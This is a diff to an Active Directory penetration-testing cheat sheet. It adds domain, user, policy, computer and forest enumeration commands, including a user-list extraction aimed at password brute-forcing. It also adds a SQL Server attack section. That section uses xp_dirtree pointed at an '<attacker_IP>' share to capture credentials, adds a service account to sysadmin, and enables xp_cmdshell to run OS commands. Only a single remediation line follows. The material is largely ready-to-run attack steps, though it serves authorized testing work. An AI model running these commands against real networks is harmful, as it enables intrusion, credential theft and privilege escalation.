@@ -8,12 +8,13 @@
 
 > After installing RSAT, you can go to "Users and Computers AD =&gt; View =&gt; Advanced"
 
-### LDAP enumeration
+### Full enumeration
 
 - [Bloodhound](https://github.com/BloodHoundAD/BloodHound) & [Sharphound injestor](https://github.com/BloodHoundAD/SharpHound3) or [bloodhound-python injestor](https://github.com/fox-it/BloodHound.py)
 - [Ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)
 - [windapsearch](https://github.com/ropnop/windapsearch)
-- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) (PowerView)
+- [https://github.com/PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
+- [PowerView 2.0 Cheatsheet](https://gist.github.com/HarmJ0y/3328d954607d71362e3c)
 
 ```bash
 # Install full bloodhound
@@ -36,24 +37,51 @@ git clone https://github.com/ropnop/windapsearch.git && pip install python-ldap 
 
 #ldapsearch
 sudo ldapsearch -x -LLL -H ldap://webmail.<domain>.fr -D "cn=<cn>" -b "dc=<domain>,dc=<fqdn>" -w '<pass>'
+
+enum4linux -a <target>
+
+Get-NetDomain
+Get-DomainSID
+
+
 ```
+
+### Users enumeration
+
+Domain users and password policy \(especially complexity and lockout threshold for bruteforce\)
+
+```bash
+net user /domain
+
+enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt
+
+Get-NetUser | select samaccountname
+```
+
+
+### Policy enumeration
+
+Domain users and password policy \(especially complexity and lockout threshold for bruteforce\)
+
+```bash
+net accounts /domain
+
+enum4linux -P -o <target>
+
+(Get-DomainPolicy);"kerberos policy"
+```
+
+### Computers enumeration
 
 Find DC IP
 
 ```bash
 cat /etc/resolv.conf
+
 nslookup <domain>
+
+Get-NetDomainController
 ```
-
-Domain users and password policy \(especially complexity and lockout threshold for bruteforce\)
-
-```bash
-enum4linux -P -o <target>
-enum4linux -a <target>
-enum4linux <target> |grep "user:" | cut -d '[' -f2 | cut -d "]" -f1 > users.txt
-```
-
-### DNS enumeration
 
 
 Domain computers 
@@ -62,6 +90,8 @@ Domain computers
 - [SharpSniper](https://github.com/HunnicCyber/SharpSniper)
 
 ```bash
+netdom query SERVER
+
 Get-ADComputer -Filter * -Property * | Select-Object Name,OperatingSystem,OperatingSystemVersion,ipv4Address | Export-CSV ADcomputerslist.csv -NoTypeInformation -Encoding UTF8
 
 #pip install git+https://github.com/dirkjanm/adidnsdump#egg=adidnsdump
@@ -71,6 +101,12 @@ adidnsdump -u <domain>\\<user> -p <pass> --dns-tcp
 
 # Find specific computer of domain user
 SharpSniper.exe emusk <username> <password>
+
+# Find computer where current user is local admin
+Find-WMILocalAdminAccess
+
+# Find computer where current can get a shell
+Get-NetComputer -Unconstrained
 ```
 
 ### Shares enumeration
@@ -126,6 +162,15 @@ Command=ToggleDesktop
 ```bash
 showmount -e <target>
 mount <target>:/home/xx /mnt/yy 
+```
+
+### Forest enumeration
+
+```bash
+Get-NetForest
+Get-NetForestCatalog
+Get-NetForestTrust
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ---
@@ -237,7 +282,8 @@ Find domain admin accounts
 
 ```bash
 net group "Domain Admins" /DOMAIN
-net group "Admins du domaine" /DOMAIN
+
+Get-NetGroupMember -GroupName "Domain Admins" -Recurse
 ```
 
 Find if one is loggedon somewhere :
@@ -293,3 +339,27 @@ net group "Domain Admins" <user> /add
 
 - [specterops.io](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
 
+## **SQL exploit**
+
+```bash
+.\PowerUpSQL.ps1
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded
+Get-SQLServerLink -Instance <fqdn_db_target> -Verbose
+Get-SQLServerLinkCrawl -Instance <fqdn_db_target>
+Invoke-SQLAudit -Verbose -Instance <db_target>
+
+SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()
+exec master.dbo.xp_dirtree '\\<attacker_IP>\<sharename>\xpdirtree_exploit'
+SELECT IS_SRVROLEMEMBER ('sysadmin') , IS_MEMBER ('db_owner'), USER_NAME()
+
+EXECUTE AS USER='dbo'
+ALTER SERVER ROLE [sysadmin]
+ADD MEMBER [<domain\sql_svcuser>]
+EXEC sp_configure 'show advanced options',1
+
+EXEC sp_configure 'xp_cmdshell',1
+EXEC master..xp_cmdshell 'whoami'
+
+# Remediation
+REVOKE Execute ON xp_dirtree FROM PUBLIC
+```
